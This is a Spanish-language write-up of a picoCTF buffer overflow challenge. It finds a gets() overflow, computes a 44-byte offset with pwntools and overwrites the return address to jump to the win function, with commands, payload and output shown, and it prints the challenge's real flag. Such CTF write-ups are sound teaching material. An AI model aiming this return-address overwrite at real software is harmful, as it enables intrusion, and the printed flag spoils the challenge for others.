## Descripción
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln).You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using `nc saturn.picoctf.net 49317`
## Solución
1. Descargar el código fuente del programa y el archivo binario.
2. Nos damos cuenta que el código usa gets lo cual nos permite debordar el bufer y hacer que el código se comporte de forma inesperada, es decir, que desborando el buffer podemos modificar la direción de retorno.
3. creamos el archivo flag.txt 
``` shell
─(kali㉿kali)-[~/pico]
└─$ echo 'flag{dummieflag}' > flag.txt

```
4. Para este reto sera necesario usar las pwn tools por lo que las instalamos.
``` shell
pip install pwntools
```
5. Realizamos las siguientes operaciones en la consola de python para btener la bandera del reto.
``` pyhton
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

```
6. Ejecutamos nuestro binario con la cadena que nos proporcionó la funcion de cyclic(100)
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ ./vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: segmentation fault  ./vuln

```
Y ejecutamos el siguiente comando en python
``` python
>>> cyclic_find(0x6161616c)
44
```
Como se puede ver al ejecutar el archivo binario con la cadena que obtuvimos de python el programa entra en una expeción y al ejecutar el comando cyclic_find este nos dice el numero de caracteres necesarios para sobrescribir la direción de retorno de la pila de ejecución, por lo que para obtener la bandera será necesario sobrescribir la direción de retorno y cambiar esta direción por la direción de la función win que es la que nos dara la bandera.

7. Obtenemos la dirección de retorno de la funcion win.
``` sehll
┌──(kali㉿kali)-[~/pico]
└─$ objdump -D vuln -M intel | grep 'win'

080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>

```

8.  Probamos los siguiente en local.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dummieflag}
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln

```

Esto nos da la bandera en local por lo que ahora lo intentamos en el servidor para obtner  la bandera real del reto.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 63221
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_2e53b270} 
```

## Notas
